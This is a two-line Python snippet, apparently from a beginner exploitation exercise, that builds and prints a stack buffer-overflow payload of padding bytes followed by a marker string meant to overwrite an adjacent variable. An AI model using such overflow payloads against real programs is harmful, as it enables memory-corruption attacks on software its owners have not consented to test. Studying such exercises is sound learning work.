payload = b"A" * 52 + b"Overflown!"  # 40 bytes for buffer + 12 bytes to overwrite target
print(payload)
